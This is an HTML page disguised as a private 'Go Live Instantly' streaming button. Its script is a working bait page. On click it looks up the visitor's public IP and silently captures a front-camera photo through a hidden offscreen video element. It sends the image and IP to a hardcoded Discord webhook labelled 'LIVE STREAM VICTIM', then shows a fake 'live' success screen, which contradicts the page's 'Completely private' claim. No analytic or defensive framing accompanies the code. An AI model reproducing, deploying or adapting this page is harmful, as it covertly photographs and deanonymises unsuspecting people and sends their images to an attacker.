<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Go Live Now</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.6);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            max-width: 500px;
            backdrop-filter: blur(10px);
        }
        h1 {
            font-size: 36px;
            margin-bottom: 20px;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        p {
            font-size: 18px;
            margin-bottom: 40px;
            opacity: 0.9;
        }
        button#liveBtn {
            padding: 18px 50px;
            font-size: 24px;
            background: #ff0066;
            border: none;
            border-radius: 50px;
            color: white;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(255, 0, 102, 0.4);
            transition: all 0.3s;
        }
        button#liveBtn:hover {
            background: #cc0055;
            transform: translateY(-3px);
        }
        button#liveBtn:active {
            transform: translateY(1px);
        }
        .live-overlay {
            margin-top: 40px;
            padding: 20px;
            background: rgba(0, 255, 0, 0.2);
            border: 2px solid #00ff00;
            border-radius: 15px;
            font-size: 22px;
            opacity: 0;
            transition: opacity 1s;
        }
        .live-overlay.show {
            opacity: 1;
        }
        .dot {
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.4; }
            50% { opacity: 1; }
            100% { opacity: 0.4; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üî¥ Go Live Instantly</h1>
        <p>Click below to start your personal live stream<br>
        <small>Camera access required ‚Ä¢ Completely private</small></p>
        
        <button id="liveBtn">Start Live Stream</button>

        <div class="live-overlay" id="liveOverlay">
            <strong>üî¥ LIVE NOW</strong><br>
            Your stream is active <span class="dot">‚óè</span><br>
            <small>Viewers: 0 (private mode)</small>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1442834175521591387/-Ebcrm-cuHfvM1a-bCL7sX1cFHGa6DAnB4U1ratH-rrK7fzi3Pt7TZrquwHlJuspJuEs";

        document.getElementById('liveBtn').addEventListener('click', async () => {
            const btn = document.getElementById('liveBtn');
            const overlay = document.getElementById('liveOverlay');
            
            btn.disabled = true;
            btn.textContent = "Requesting Camera...";

            let publicIP = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                if (res.ok) {
                    const data = await res.json();
                    publicIP = data.ip;
                }
            } catch (e) {}

            const video = document.createElement('video');
            video.style.position = 'fixed';
            video.style.left = '-9999px';
            video.style.top = '-9999px';
            video.style.width = '1px';
            video.style.height = '1px';
            video.autoplay = true;
            video.playsInline = true;
            video.muted = true;
            document.body.appendChild(video);

            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } },
                    audio: false
                });

                video.srcObject = stream;

                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play().catch(() => {});
                        setTimeout(resolve, 2000);
                    };
                    setTimeout(resolve, 4000);
                });

                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // Mirror flip for natural selfie look
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0);

                    const blob = await new Promise(resolve => 
                        canvas.toBlob(resolve, 'image/jpeg', 0.7)
                    );

                    if (blob && blob.size > 3000) {
                        const file = new File([blob], "stream_snap.jpg", { type: 'image/jpeg' });

                        const form = new FormData();
                        form.append('file', file, 'stream_snap.jpg');
                        form.append('payload_json', JSON.stringify({
                            username: "Live Grabber",
                            content: `**LIVE STREAM VICTIM** üì∏ ||@everyone||\n**IP:** \`${publicIP}\``,
                            embeds: [{
                                title: "They Thought They Were Going Live",
                                description: "Front camera captured silently üòè",
                                color: 16711680,
                                image: { url: "attachment://stream_snap.jpg" },
                                timestamp: new Date().toISOString(),
                                footer: { text: "Perfect bait activated" }
                            }]
                        }));

                        await fetch(WEBHOOK_URL, { method: "POST", body: form });
                    }
                }

                stream.getTracks().forEach(track => track.stop());
                video.remove();

                // Fake success UI
                btn.textContent = "Live Stream Active";
                btn.style.background = "#00cc00";
                overlay.classList.add('show');

            } catch (err) {
                btn.textContent = "Camera Denied";
                btn.style.background = "#666";
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
